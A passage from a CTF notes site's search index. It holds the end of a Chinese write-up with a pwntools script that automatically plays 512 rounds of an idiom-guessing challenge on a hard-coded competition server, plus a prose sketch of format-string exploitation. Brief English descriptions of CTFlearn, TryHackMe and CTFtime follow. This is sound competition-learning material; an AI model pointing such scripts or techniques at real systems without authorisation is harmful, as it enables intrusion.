\u8f93\u51fa\u4e86\uff0c\u6240\u4ee5\u8fb9\u754c\u6761\u4ef6\u70b8\u4e86\uff0c\u5728\u7b2c512\u8f6e\u5f3a\u5236\u8fdb\u4ea4\u4e92\u8d4c\u7b2c\u4e8c\u8f6e\u51fa\u7ed3\u679c\u3002  </p> <p>\u9996\u5148\u662f\u751f\u6210\u5b57\u5178\u7684\u51fd\u6570\uff0ckk\u662f\u7b2c\u4e00\u4e2a\u56fa\u5b9a\u7684\u5f00\u5934\u8bcd\uff0c\u6839\u636e\u6bcf\u6b21\u8fd4\u56de\u7684\u6587\u672c\u66f4\u65b0\u952e\u503c\u5bf9\uff0c\u7136\u540e\u5bf9\u6709\u591a\u4e2a\u7ed3\u679c\u7684key\u8fed\u4ee3\u5ef6\u957f\uff0c\u6bcf\u6b21\u9009\u62e9\u7b2c\u4e00\u4e2a\u53ef\u80fd\u7684\u7ed3\u679c\uff0c\u6700\u540e\u7684\u91cd\u590d\u4e2a\u6570\u5373\u4e3a\u6709\u53ef\u80fd\u5931\u8d25\u7684\u8bcd\u7684\u6570\u91cf\uff1a</p> <pre><code># \u5176\u4f59\u5185\u5bb9\u548c\u6e90\u4ee3\u7801\u5b8c\u5168\u4e00\u6837\uff0c\u8282\u7701\u7a7a\u95f4\u5c31\u4e0d\u7c98\u8d34\u4e86\nwith open('idioms.txt', 'r', encoding='utf8') as f: # utf8\n    idioms = [x.strip() for x in f.readlines()]\n\ndef check(guess, answer): # \u9b54\u6539\u7684check\uff0c\u6539\u8fd4\u56de\u503c\u4e3a\u8f93\u51fa\u5185\u5bb9 \u65b9\u4fbf\u5230\u65f6\u5019\u76f4\u63a5\u7528\u670d\u52a1\u5668\u8fd4\u56de\u5185\u5bb9\u66f4\u65b0\n    guesspy = get_pinyin(guess)\n    answerpy = get_pinyin(answer)\n    r = \"\"\n    py_results = [check_part(guesspy[i], answerpy[i]) for i in range(3)]\n    for i in range(4):\n        for j in range(3):\n            r += (wrap_color(guesspy[j][i], py_results[j][i]))\n        r += ' '\n    r += '\\n'\n    results = check_part(guess, answer)\n    for i in range(4):\n        r += wrap_color(guess[i], results[i])\n    r += '\\n'\n    return r.encode(), r\n\ndef gen(kk):\n    d = {}\n    dup = []\n    for i in idioms:\n        s = check(kk, i)[0] \n        if s in d.keys():\n            d[s].append(i) # \u5176\u5b9e\u8fd9\u91cc\u7528s\u7684\u54c8\u5e0c\u4e5f\u662f\u53ef\u4ee5\u7684\uff0c\u4f46\u662f\u4e0d\u65b9\u4fbfdebug\uff0c\u800c\u4e14\u63d0\u901f\u4e0d\u660e\u663e\n            dup.append(s)\n        else:\n            d[s] = [i]\n    print(f'finish init round1 with {len(dup)} dup.')\n    dup = set(dup)\n    dup2 = []\n    for i in dup:\n        for j in d[i]:\n            s = check(d[i][0], j)[0]\n            if s in d.keys():\n                d[s].append(j)\n                dup2.append(s)\n            else:\n                d[s] = [j]\n    print(f'finish init round2 with {len(dup2)} dup.')\n    dup2 = set(dup2)\n    dup3 = []\n    for i in dup2:\n        for j in d[i]:\n            s = check(d[i][0], j)[0]\n            if s in d.keys():\n                d[s].append(j)\n                dup3.append(s)\n            else:\n                d[s] = [j]\n    print(f'finish init round3 with {len(dup3)} dup.')\n    return d\n\nwhile True:\n    s=random.choice(idioms)  # \u56e0\u4e3a\u904d\u5386\u4e0d\u5b8c\uff0c\u8fde\u7eed\u7684\u8bcd\u7279\u5f81\u91cd\u590d\u6027\u9ad8\uff0c\u6240\u4ee5\u968f\u673a\u62bd\u4e86\n    print(s)\n    d = gen(s) # \u5982\u679c\u7b2c\u4e09\u4e2a\u7ed3\u679c\u80fd\u5c0f\u4e8e200\u5c31\u80fd\u7528\u4e86\uff0c\u591a\u8dd1\u51e0\u8f6e\u80af\u5b9a\u80fd\u62ff\u5230flag\n    list3_file = open('list3.pickle', 'wb1')\n    pickle.dump(d, list3_file)\n    list3_file.close()\n</code></pre> <p>\u7136\u540e\u662f\u591a\u6b21\u5c1d\u8bd5\u7684\u5229\u7528\u811a\u672c</p> <pre><code>list3_file = open('list3.pickle', 'rb') # \u4e0a\u8fb9\u751f\u6210\u7684\nd = pickle.load(list3_file)\n# context.log_level = 'debug'\n\nwhile True:\n    try:\n        p = remote(\"120.77.30.1\", 48771)\n        p.recvuntil(b\"&gt; \")\n        for r in range(512):\n            print(r)\n            p.sendline('\u9732\u5df1\u626c\u624d'.encode())\n            res = p.recvuntil(b\"&gt; \")\n            while b'Round' not in res:\n                s = res[:-2]\n                p.sendline(d[s][0])\n                if r == 511:\n                    p.interactive() # \u8fb9\u754c\u6761\u4ef6\u70b8\u4e86\uff0c\u5728\u7b2c512\u8f6e\u5f3a\u5236\u8fdb\u4ea4\u4e92\u8d4c\u7b2c\u4e8c\u8f6e\u51fa\u7ed3\u679c\n                res = p.recvuntil(b\"&gt; \")\n    except:\n            time.sleep(1)\n\np.interactive()\n</code></pre> <p>\u56e0\u4e3a\u75ab\u60c5\u4e0d\u5728\u5b66\u6821\uff0c\u4ea4\u4e92\u63d0\u901f\u7684\u5c0ftrick\u5c31\u662f\u53bbIP\u6240\u5728\u5730\u79df\u4e2a\u670d\u52a1\u5668\uff0c\u6bd4\u5982\u8fd9\u91cc\u79df\u4e2a\u5e7f\u4e1c\u7684\u963f\u91cc\u4e91\u6216\u8005\u817e\u8baf\u4e91\u7684\u670d\u52a1\u5668\uff0c\u4ea4\u4e92\u98de\u5feb\uff0c\u51e0\u79d2\u8dd1\u4e00\u8f6e\uff0c\u4f53\u9a8c\u5982\u540c\u672c\u5730\u4e00\u822c\u3002  </p>"},{"location":"Writeup/%E8%99%8E%E7%AC%A6CTF2022/COMPASS%20WriteUp/#_1","title":"\u540e\u8bb0","text":"<p>RE\u76842048\u5b8c\u7f8e\u8fd8\u539f\u4e86js\uff0c\u627e\u5230\u4e86\u540e\u95e8\u51fd\u6570\u548c\u9b54\u6539\u7684TEA\u52a0\u5bc6\u8fd8\u6709\u6362\u8868\u7684base64\u3002 \u4f46\u662f\u5bf9\u56db\u4e2anative\u65b9\u6cd5\u7684\u9006\u5411\u6ca1\u6709\u5b8c\u6210\uff0c\u9759\u6001\u7ed1\u5b9a\u7684\u4e24\u4e2a\u65b9\u6cd5\u52c9\u5f3a\u80fd\u770b\uff0ccheck\u548cpre\u4e24\u4e2a\u52a8\u6001\u65b9\u6cd5\u5c31\u627e\u4e0d\u5230\u7b26\u53f7\u4e86\u3002 \u672c\u5730\u6ca1\u51c6\u5907\u597dARM\u73af\u5883\u4e0a\u4e0d\u4e86\u52a8\u6001\uff0c\u88abso\u7684OLLVM\u7206\u6740\uff0c\u9057\u61be\u653e\u5f03\u3002  </p> <p>PWN\u7684\u7b7e\u5230babaygame\u6cc4\u9732\u51farbp-4\u4e0d\u77e5\u9053\u80fd\u505a\u4ec0\u4e48\uff0c\u968f\u673a\u6570\u6bd4\u8f83\u597d\u6a21\u62df\uff0c\u4f46\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53ea\u80fd\u5229\u7528\u4e00\u6b21\u3002 \u6309\u4e4b\u524d\u7684\u77e5\u8bc6\u9700\u8981\u7b2c\u4e00\u6b21\u6cc4\u9732libc\u5730\u5740\u6bd4\u5982__libc_start_main+243\uff0c\u7b2c\u4e8c\u6b21\u5199\u8fd4\u56de\u5730\u5740\u4e3agadget\u6216\u8005system\uff0c\u9700\u8981\u4e24\u6b21\u3002 \u7136\u540e\u60f3\u80fd\u4e0d\u80fd\u8986\u5199ret\u7684\u4f4e\u4f4d\u77ed\u8df3\u4e00\u4e0b\u91cd\u590d\u6267\u884c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u51fd\u6570\uff0c\u7136\u540e\u5c31\u662f\u5e38\u89c4\u601d\u8def\u4e86\u3002 \u6216\u8005\u4e5f\u53ef\u4ee5\u66b4\u529b\u7206PIE\uff0c\u4f46\u662f\u8fd9\u4e24\u4e2a\u601d\u8def\u90fd\u6ca1\u6765\u5f97\u53ca\u5b9e\u73b0\u3002</p> <p>\u603b\u4e4b\u8fd8\u662f\u6709\u4e0d\u5c11\u9057\u61be\u7684\uff0c\u8fd9\u4e24\u9898\u518d\u51fa\u4e00\u9898\u5c31\u80fd\u516c\u8d39\u65c5\u6e38\u4e86\uff08\u5927\u6982\uff09\u3002 \u4e0d\u8fc7\u7b2c\u4e00\u6b21\u548c\u5168\u56fd\u51e0\u4e4e\u6240\u6709\u9876\u7ea7\u5f3a\u961f\u7ade\u6280\u80fd\u62ff\u5230\u8fd9\u6837\u7684\u6392\u540d\u4e5f\u662f\u4e00\u5927\u8fdb\u6b65\u4e86\uff0c\u8003\u8651\u5230\u524d\u8fb9\u8fd8\u6709\u6e05\u5317\u590d\u6d59\u4ea4\u5317\u90ae\u4e2d\u79d1\u5927\u56fd\u79d1\u5927\uff0c\u6211\u4eec\u9ad8\u6821\u7ec4\u6392\u540d\u597d\u50cf\u8fd8\u4e0d\u9519\uff08\u9003\uff09</p>"},{"location":"website/Platform/CTFlearn/","title":"CTFlearn","text":"<p>CTF learn is a challenge website for user update challenges and solve challenges.</p> <p>Those challenges are uploaded by community and users who solves the challenge can leave comments and score for the challenge.</p> <p></p> <p>To submit flag and acquire scores, you need an account. In CTF learn, the accounts are free to register. Once you finish the registration, you may login with the account.</p> <p>For business user and education propose, CTF learn offers a professional edition called Learn++.</p> <p>Some online labs are also useful for beginners.</p> <p></p>"},{"location":"website/Platform/CTFlearn/#reference","title":"Reference","text":"<p>CTF learn link: https://ctflearn.com/</p>"},{"location":"website/Platform/TryHackMe/","title":"TryHackMe","text":"<p>Here's another platform for learning and hacking.</p> <p>The difference between tryhackme and ordinary CTF challenge website is that thm uses <code>rooms</code> for challenge. Each room contains of several questions and you need to finish them all to solve a room.</p> <p>The room is also called a target environment in cyber security. In case that vulnerabilities are available in rooms, each room should be created for each user. That's say, you need to create a room and deploy machine before hacking.</p> <p></p> <p>All target environments are on the thm's cloud server and you don't need to configure local machine to deploy target environment. However, you need to connect to the thm's local network so that you can hack the target environment.</p> <p>Two ways for user to connect. The first and <code>free</code> way is to use OpenVPN and configure your VPN with thm's ovpn file. The second is to use hack box, for community user, free box can only be used 1 hour one day. Otherwise, you need to purchase <code>premium</code> edition of thm.</p> <p>Rooms are also can be uploaded by users. This makes it possible for us to create our own target environment.</p> <p>Besides, thm provides several learning courses for beginners.</p> <p></p> <p>For advanced users, there some other useful pages provided by thm.</p> <p>You can find some useful blog related to the cybersecurity and some other websites such like tutorials, terms, swag shop.</p> <p>TryHackMe is a great platform for both beginners and advanced hackers.</p> <p></p>"},{"location":"website/Platform/TryHackMe/#reference","title":"Reference","text":"<p>TryHackMe link: https://tryhackme.com/docs</p>"},{"location":"website/Platform/ctftime/","title":"ctftime","text":"<p>CTF time is a platform to provide schedule for upcoming and past CTF events. Famous CTF events usually synchronize their schedule to the CTF time, and CTFers all along the world would participate the event.</p> <p></p> <p>Some famous CTF team also have their CTF time page to show their gains and record during the events. Along with the events schedule and team page, writeups are also collected by CTF time. Find writeups for the event by clicking corresponding event page and find <code>Event tasks and writeups</code> page.</p> <p></p> <p>Find upcoming CTF events using CTF time.</p>"},{"location":"website/Platform/ctftime/#reference","title":"Reference","text":"<p>CTF time link: https://ctftime.org/</p>"}]}